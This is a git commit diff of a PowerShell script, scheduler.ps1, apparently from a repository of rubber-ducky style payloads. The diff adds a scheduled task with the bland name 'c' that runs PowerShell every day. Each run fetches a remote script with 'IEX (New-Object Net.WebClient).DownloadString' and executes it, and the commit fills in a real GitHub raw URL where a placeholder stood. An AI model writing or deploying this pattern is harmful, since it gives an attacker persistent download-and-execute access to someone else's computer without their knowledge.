96b1a4b2eb47fea7d83bdd42e5a05595688536a5
luigit12 <58264257+Luigit12@users.noreply.github.com>
2020-12-11 07:24:57 +0100

    Update scheduler.ps1

--- scheduler.ps1
+++ scheduler.ps1
@@ -1,5 +1,5 @@
-$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'IEX (New-Object Net.WebClient).DownloadString('link');'
+$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Luigit12/rubduck/master/what.ps1');'
 
-$trigger = New-ScheduledTaskTrigger -Daily -At 11am
+$trigger = New-ScheduledTaskTrigger -Daily -At 11:00
 
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "c"
